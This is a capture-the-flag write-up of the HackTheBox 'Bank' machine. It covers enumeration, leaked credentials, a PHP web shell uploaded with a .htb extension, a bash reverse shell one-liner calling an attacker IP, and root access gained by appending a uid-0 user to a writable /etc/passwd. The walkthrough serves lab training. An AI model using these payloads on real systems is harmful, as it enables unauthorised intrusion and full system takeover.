---
title: Bank
tags:
  - HackTheBox
  - Easy
  - Linux
  - Enumeration
  - File-Upload
  - SUID
  - /etc/passwd
date: 2025-04-01T00:00:00Z
---
![](Pasted%20image%2020250401155607.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.29 bank.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- bank.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=
|   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh
53/tcp open  domain  syn-ack ttl 63
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    syn-ack ttl 63
| http-title: HTB Bank - Login
|_Requested resource was login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

So I checked its website:

![](Pasted%20image%2020250401155759.png)

Wappalyzer got version `5.5.9` of PHP running.

I decided to perform some enumeration with [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://bank.htb

[redacted]
[15:59:51] 200 -  480B  - /assets/ 
[16:00:01] 200 -  508B  - /inc/
[16:00:17] 302 -    3KB - /support.php  ->  login.php                       
[16:00:19] 301 -  305B  - /uploads  ->  http://bank.htb/uploads/            
[16:00:19] 403 -  283B  - /uploads/                                         
```

So I checked the `/assets` endpoint. I found a strange database inside `/assets/img` called `Thumbs.db`:

![](Pasted%20image%2020250401160214.png)

It has a passphrase, so I'll enumerate further:

![](Pasted%20image%2020250401160400.png)

So I performed a deeper enumeration again and this time got a new directory:

```shell
dirsearch -u http://bank.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

[redacted]
[16:22:58] 301 -  314B  - /balance-transfer  ->  http://bank.htb/balance-transfer/
```

So I checked it:

![](Pasted%20image%2020250401162406.png)

I ordered them by size and found one that is significantly smaller than the others:

![](Pasted%20image%2020250401162513.png)

![](Pasted%20image%2020250401162527.png)

> So I found some credentials: `chris@bank.htb:!##HTBB4nkP4ssw0rd!##`

![](Pasted%20image%2020250401162645.png)

## Weaponization

Inside `support.php` I can upload files, so I'll test the functionality:

![](Pasted%20image%2020250401162750.png)

![](Pasted%20image%2020250401162835.png)

I can access to my tickets:

![](Pasted%20image%2020250401163202.png)

I could try to upload a web shell:

```shell
<?php system($_GET["cmd"]);?>
```

![](Pasted%20image%2020250401163255.png)

## Exploitation

So after a few trial-error I performed some enumeration again and found that any `.htb` ended files are executed as php inside the webserver:

![](Pasted%20image%2020250401163555.png)

So I'll upload a `shell.htb` containing a basic webshell:

```php
<?php system($_GET["cmd"]);?>
```

![](Pasted%20image%2020250401163654.png)

> I got a web shell :D

![](Pasted%20image%2020250401163716.png)

So now I'll use the following payload to gain internal access via a reverse shell:

```shell
bash -c "bash -i >& /dev/tcp/10.10.14.4/666 0>&1"

# URL Encoded
bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E4%2F666%200%3E%261%22
```

> Got a reverse shell :D

![](Pasted%20image%2020250401164515.png)

### User flag

![](Pasted%20image%2020250401165019.png)

## Privilege Escalation

I'll search for SUID binaries:

```shell
find / -type f -user root -perm -4000 2>/dev/null

/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd                                                                  
/usr/bin/chfn    
/usr/bin/pkexec  
/usr/bin/newgrp     
/usr/bin/traceroute6.iputils    
/usr/bin/gpasswd          
/usr/bin/sudo     
/usr/bin/mtr     
/usr/sbin/pppd    
/bin/ping        
/bin/ping6    
/bin/su   
/bin/fusermount  
/bin/mount    
/bin/umount
```

So I'll check `/var/htb/bin/emergency`:

```shell
ls -la /var/htb/bin/emergency                    
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
```

As I've got execution permissions on it I'll execute it:

![](Pasted%20image%2020250401165332.png)

> So easy btw :v

### ALTERNATIVE to root

```shell
ls -la /etc/passwd
-rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd
```

So I can basically read and write its contents. This is a huge problem because I can basically generate myself access as root.

- First I’ll generate a password hash for the password `gitblanc` using openssl:

```shell
openssl passwd -1 gitblanc
$1$1UdUo6cT$1P6S7ZcGJnWP8vsMpn0zu.
```

- Then I’ll add a line to `/etc/passwd` using echo:

```shell
echo 'gitblanc:$1$1UdUo6cT$1P6S7ZcGJnWP8vsMpn0zu.:0:0:fvcked:/root:/bin/bash' >> /etc/passwd
```

- Now I'll log in as `gitblanc`:

```shell
su - gitblanc
```

![](Pasted%20image%2020250401170012.png)

### Root flag

![](Pasted%20image%2020250401170248.png)

==Machine pwned!==